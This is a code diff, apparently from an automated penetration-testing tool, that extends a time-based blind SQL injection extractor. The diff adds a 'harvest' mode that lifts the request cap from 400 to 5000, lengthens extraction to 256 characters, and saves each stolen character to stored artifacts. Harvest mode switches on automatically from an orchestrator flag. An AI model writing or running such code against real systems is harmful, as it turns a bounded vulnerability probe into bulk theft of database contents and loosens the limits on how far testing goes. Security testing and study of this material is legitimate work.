@@ -126,7 +126,9 @@ def _llm_extract_prior(table, column, dbms, context=None):
 
 def extract_string(url, param, table, column, dbms="mysql", method="GET",
                    headers=None, timeout=15, delay_seconds=4, max_length=64,
-                   max_requests=400, roe_guard=None, verify=None, prior=None):
+                   max_requests=400, roe_guard=None, verify=None, prior=None,
+                   mode="probe", target=None, hard_ceiling=5000,
+                   extended_max_length=256):
     if verify is None:
         verify = _verify_tls()
     template_key = dbms + "_time"
@@ -154,8 +156,10 @@ def extract_string(url, param, table, column, dbms="mysql", method="GET",
     except Exception:
         pass
 
-    for pos in range(1, max_length + 1):
-        if requests_made >= max_requests:
+    effective_max_length = extended_max_length if mode == "harvest" else max_length
+    effective_max_requests = hard_ceiling if mode == "harvest" else max_requests
+    for pos in range(1, effective_max_length + 1):
+        if requests_made >= effective_max_requests:
             break
         guess = prior[pos - 1] if (prior and pos - 1 < len(prior)) else None
         if (guess is not None and 32 <= ord(guess) <= 126
@@ -198,6 +202,15 @@ def extract_string(url, param, table, column, dbms="mysql", method="GET",
         if low <= 32:
             break
         out += chr(low)
+        if mode == "harvest" and target:
+            try:
+                from . import artifacts
+                artifacts.write(target, "blind_extract_char", {
+                    "table": table, "column": column, "pos": pos,
+                    "char": chr(low),
+                })
+            except Exception:
+                pass
 
     return {"extracted": out, "requests": requests_made, "baseline_ms": round(baseline_ms, 1)}
 
@@ -211,6 +224,7 @@ def _tool_blind_extract(orch, args):
     max_length = int(args.get("max_length") or 64)
     max_requests = int(args.get("max_requests") or 400)
     roe_guard = getattr(orch, "roe_guard", None)
+    mode = args.get("mode") or ("harvest" if getattr(orch, "harvest_mode", False) else "probe")
 
     dbms, fp_info = fingerprint_dbms(url, param, method, timeout=15,
                                      roe_guard=roe_guard)
@@ -222,7 +236,8 @@ def _tool_blind_extract(orch, args):
 
     result = extract_string(url, param, table, column, dbms=dbms,
                              method=method, max_length=max_length,
-                             max_requests=max_requests, roe_guard=roe_guard)
+                             max_requests=max_requests, roe_guard=roe_guard,
+                             mode=mode, target=orch.target)
     extracted = result.get("extracted", "")
     if not extracted:
         return {"verdict": "UNKNOWN",
